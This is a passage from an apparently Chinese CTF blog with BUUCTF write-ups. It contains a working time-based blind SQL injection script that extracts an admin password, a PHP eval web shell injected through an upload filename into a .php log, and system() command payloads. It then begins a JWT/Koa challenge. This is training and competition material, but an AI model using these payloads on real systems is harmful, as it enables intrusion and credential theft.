class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://3b957018-00b0-4c15-be8e-7990ee9455c2.node5.buuoj.cn:81/image.php?id=\\0&amp;path=%20&#x27;</span><br><br><span class="hljs-comment"># database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;ciscnfinal&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;users&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">90</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># payload = &quot;1/**/and/**/if(ascii(substr((seLEct(GrOUp_cOncAT(&#123;0&#125;))from(&#123;1&#125;)),&#123;2&#125;,1))&gt;&#123;3&#125;,sleep(5),1)#&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload = <span class="hljs-string">&#x27;or%20if(ascii(substr((seLEct(GrOUp_cOncAT(&#123;0&#125;))from(&#123;1&#125;)),&#123;2&#125;,1))&gt;&#123;3&#125;,sleep(5),1)%23&#x27;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-built_in">print</span>(payload)<br>            <span class="hljs-comment"># å¼€å§‹è®°æ—¶</span><br>            start_time = time.time()<br>            r = requests.get(url+payload)<br>            <span class="hljs-keyword">if</span> (time.time() - start_time &gt; <span class="hljs-number">5</span>):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130164258133.png" alt="image-20240130164258133"></p><p>å¾—åˆ°passwordå­—æ®µå€¼ä¸º68c826b202e999de9b3cï¼Œusernameçš„å­—æ®µå€¼ä¸ºadmin</p><p>æ²¡æœ‰çˆ†å‡ºè·Ÿflagç›¸å…³çš„ä¿¡æ¯ï¼Œä½†æ˜¯ç½‘é¡µå­˜åœ¨ä¸€ä¸ªç™»å½•çª—å£ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç™»å½•ä¸€ä¸‹</p><h2 id="ä½¿ç”¨è·å–åˆ°çš„ç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯ç™»å½•ç½‘é¡µ"><a href="#ä½¿ç”¨è·å–åˆ°çš„ç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯ç™»å½•ç½‘é¡µ" class="headerlink" title="ä½¿ç”¨è·å–åˆ°çš„ç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯ç™»å½•ç½‘é¡µ:"></a>ä½¿ç”¨è·å–åˆ°çš„ç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯ç™»å½•ç½‘é¡µ:</h2><p><img src="/images/2023-08-20-Easyweb/image-20240130164533361.png" alt="image-20240130164533361"></p><p><img src="/images/2023-08-20-Easyweb/image-20240130164511136.png" alt="image-20240130164511136"></p><p>å‘ç°ç½‘é¡µå†…éƒ¨æ˜¯æ–‡ä»¶ä¸Šä¼ .</p><h2 id="ä¸Šä¼ æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶"><a href="#ä¸Šä¼ æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶:"></a>ä¸Šä¼ æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶:</h2><p>phpåç¼€åçš„æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šä¼ äº†å›¾ç‰‡æœ¨é©¬æ–‡ä»¶:</p><p><img src="/images/2023-08-20-Easyweb/image-20240130165927307.png" alt="image-20240130165927307"></p><p>å¯ä»¥å¾—åˆ°ä¸Šä¼ ä¿¡æ¯:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">I logged the file name you uploaded to logs/upload.becfb4d956c77553d220df9fce7d4873.log.php. LOL&lt;script&gt;setTimeout(&#x27;location.href=&quot;user.php&quot;&#x27;,3000);<br></code></pre></td></tr></table></figure><p>å‘ç°å“åº”ç»™æˆ‘ä»¬çš„å†…å®¹æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶ï¼Œä¸”ä¸Šä¼ æ–‡ä»¶æ—¥å¿—æ˜¯ä¸€ä¸ªphpåç¼€çš„æ–‡ä»¶</p><h3 id="æ—¥å¿—æ–‡ä»¶æ¼æ´"><a href="#æ—¥å¿—æ–‡ä»¶æ¼æ´" class="headerlink" title="æ—¥å¿—æ–‡ä»¶æ¼æ´:"></a>æ—¥å¿—æ–‡ä»¶æ¼æ´:</h3><h4 id="å‡è®¾æˆ‘ä»¬çš„filename-hacker-pngä»¥åŠsouth666"><a href="#å‡è®¾æˆ‘ä»¬çš„filename-hacker-pngä»¥åŠsouth666" class="headerlink" title="å‡è®¾æˆ‘ä»¬çš„filename&#x3D;hacker.pngä»¥åŠsouth666:"></a>å‡è®¾æˆ‘ä»¬çš„filename&#x3D;hacker.pngä»¥åŠsouth666:</h4><h5 id="filename-hacker-png"><a href="#filename-hacker-png" class="headerlink" title="filename&#x3D;hacker.png:"></a>filename&#x3D;hacker.png:</h5><p><img src="/images/2023-08-20-Easyweb/image-20240130174235896.png" alt="image-20240130174235896"></p><h5 id="filename-south666"><a href="#filename-south666" class="headerlink" title="filename&#x3D;south666:"></a>filename&#x3D;south666:</h5><p><img src="/images/2023-08-20-Easyweb/image-20240130174540103.png" alt="image-20240130174540103"></p><h4 id="è®¿é—®è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"><a href="#è®¿é—®è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶" class="headerlink" title="è®¿é—®è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶:"></a>è®¿é—®è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/logs/upload.becfb4d956c77553d220df9fce7d4873.log.php<br></code></pre></td></tr></table></figure><h5 id="å“åº”ç»“æœ1ï¼š"><a href="#å“åº”ç»“æœ1ï¼š" class="headerlink" title="å“åº”ç»“æœ1ï¼š"></a>å“åº”ç»“æœ1ï¼š</h5><p><img src="/images/2023-08-20-Easyweb/image-20240130174313391.png" alt="image-20240130174313391"></p><h5 id="å“åº”ç»“æœ2ï¼š"><a href="#å“åº”ç»“æœ2ï¼š" class="headerlink" title="å“åº”ç»“æœ2ï¼š"></a>å“åº”ç»“æœ2ï¼š</h5><p><img src="/images/2023-08-20-Easyweb/image-20240130174929975.png" alt="image-20240130174929975"></p><p>å‘ç°æˆ‘ä»¬çš„æ–‡ä»¶åè¢«å†™å…¥è¯¥æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è®©filenameä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œé‚£ä¹ˆè¿™ä¸ªä¸€å¥è¯æœ¨é©¬ä¹Ÿä¼šè¢«å†™å…¥è¯¥æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œåˆå› ä¸ºè¯¥æ—¥å¿—æ–‡ä»¶æ˜¯phpåç¼€ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿è¡Œè¢«å†™å…¥çš„ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œè¾¾åˆ°æœ¨é©¬æ³¨å…¥ã€‚</p><h2 id="ä½¿ç”¨æ–‡ä»¶åä¸ºä¸€å¥è¯æœ¨é©¬è¿›è¡Œæ³¨å…¥"><a href="#ä½¿ç”¨æ–‡ä»¶åä¸ºä¸€å¥è¯æœ¨é©¬è¿›è¡Œæ³¨å…¥" class="headerlink" title="ä½¿ç”¨æ–‡ä»¶åä¸ºä¸€å¥è¯æœ¨é©¬è¿›è¡Œæ³¨å…¥:"></a>ä½¿ç”¨æ–‡ä»¶åä¸ºä¸€å¥è¯æœ¨é©¬è¿›è¡Œæ³¨å…¥:</h2><p>ä½¿ç”¨phpçŸ­æ ‡ç­¾çš„ç›®çš„æ˜¯ä¸ºäº†è®©æ–‡ä»¶åä¸­çš„å­—ç¬¦ä¸ºåˆæ³•å­—ç¬¦</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=&quot;&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130173145271.png" alt="image-20240130173145271"></p><h2 id="è®¿é—®æ—¥å¿—æ–‡ä»¶"><a href="#è®¿é—®æ—¥å¿—æ–‡ä»¶" class="headerlink" title="è®¿é—®æ—¥å¿—æ–‡ä»¶:"></a>è®¿é—®æ—¥å¿—æ–‡ä»¶:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/logs/upload.becfb4d956c77553d220df9fce7d4873.log.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130173453782.png" alt="image-20240130173453782"></p><h2 id="è·å–æ ¹ç›®å½•ä¿¡æ¯"><a href="#è·å–æ ¹ç›®å½•ä¿¡æ¯" class="headerlink" title="è·å–æ ¹ç›®å½•ä¿¡æ¯:"></a>è·å–æ ¹ç›®å½•ä¿¡æ¯:</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>a=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130173346505.png" alt="image-20240130173346505"></p><h2 id="è·å–flagæ–‡ä»¶ä¿¡æ¯"><a href="#è·å–flagæ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è·å–flagæ–‡ä»¶ä¿¡æ¯:"></a>è·å–flagæ–‡ä»¶ä¿¡æ¯:</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>a=system(&#x27;cat /flag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-20-Easyweb/image-20240130173546490.png" alt="image-20240130173546490"></p><p>flag&#x3D;flag{2b086623-9f7e-4dc7-aa6f-6e9733d3c01b}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [HFCTF2020]EasyLogin</title>
    <link href="/2024/02/03/2023-2-3-EasyLogin/"/>
    <url>/2024/02/03/2023-2-3-EasyLogin/</url>
    
    <content type="html"><![CDATA[<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h3><p>[BUUCTFâ€”<a href="https://blog.csdn.net/m0_62107966/article/details/126801065">HFCTF2020]EasyLoginä¿å§†çº§è¯¦è§£ã€‚-CSDNåšå®¢</a></p><p>[åˆ·é¢˜<a href="https://www.cnblogs.com/karsa/p/12762297.html">HFCTF2020]EasyLogin - kar3a - åšå®¢å›­ (cnblogs.com)</a></p><h3 id="æ³¨å†Œä¸€ä¸ªè´¦æˆ·ç™»é™†å"><a href="#æ³¨å†Œä¸€ä¸ªè´¦æˆ·ç™»é™†å" class="headerlink" title="æ³¨å†Œä¸€ä¸ªè´¦æˆ·ç™»é™†å:"></a>æ³¨å†Œä¸€ä¸ªè´¦æˆ·ç™»é™†å:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129153552517.png" alt="image-20240129153552517"></p><h3 id="æŸ¥çœ‹ç½‘é¡µçš„æºä»£ç "><a href="#æŸ¥çœ‹ç½‘é¡µçš„æºä»£ç " class="headerlink" title="æŸ¥çœ‹ç½‘é¡µçš„æºä»£ç :"></a>æŸ¥çœ‹ç½‘é¡µçš„æºä»£ç :</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bootstrap-css&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/app.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrapper fadeInDown&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;formContent&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fadeIn first&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Welcome south<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fadeIn second&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;The flag will be here...&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fadeIn third&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Get Flag&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getflag()&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;formFooter&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;underlineHover&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;logout()&quot;</span>&gt;</span>é€€å‡ºå½“å‰è´¦å·<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/app.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŒœæµ‹ç½‘é¡µè·å–flagçš„æ–¹å¼å’Œå†…éƒ¨çš„app.jsæœ‰å…³</p><h3 id="è®¿é—®app-js"><a href="#è®¿é—®app-js" class="headerlink" title="è®¿é—®app.js:"></a>è®¿é—®app.js:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</span><br><span class="hljs-comment"> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123; username, password, <span class="hljs-attr">authorization</span>: token &#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123; status &#125; = data;<br>            <span class="hljs-keyword">if</span> (status) &#123;<br>                <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/home&quot;</span>;<br>            &#125;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123; username, password &#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123; token &#125; = data;<br>            <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>, token);<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/login&quot;</span>;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123; status &#125; = data;<br>        <span class="hljs-keyword">if</span> (status) &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123; flag &#125; = data;<br>        $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>(flag);<br>    &#125;).<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªgetflag()å‡½æ•°ï¼Œè¯¥å‡½æ•°åº”è¯¥å°±æ˜¯ç”¨æ¥è·å–flag</p><h3 id="è®¿é—®-api-flag"><a href="#è®¿é—®-api-flag" class="headerlink" title="è®¿é—®&#x2F;api&#x2F;flag:"></a>è®¿é—®&#x2F;api&#x2F;flag:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129153839638.png" alt="image-20240129153839638"></p><p>å‘ç°æˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®è¯¥æ–‡ä»¶ï¼ŒåŒæ—¶é€šè¿‡æŠ“åŒ…æˆ‘ä»¬è§‚å¯Ÿåˆ°cookieçš„èº«ä»½éªŒè¯é‡‡ç”¨äº†jwtåŠ å¯†</p><h3 id="è¿”å›è§‚å¯Ÿapp-js"><a href="#è¿”å›è§‚å¯Ÿapp-js" class="headerlink" title="è¿”å›è§‚å¯Ÿapp.js:"></a>è¿”å›è§‚å¯Ÿapp.js:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129154031289.png" alt="image-20240129154031289"></p><p>å¯ä»¥æ ¹æ®å‡ºé¢˜äººçš„æç¤ºå¾—åˆ°ç½‘é¡µé‡‡ç”¨koaæ¡†æ¶</p><h3 id="koaæ¡†æ¶"><a href="#koaæ¡†æ¶" class="headerlink" 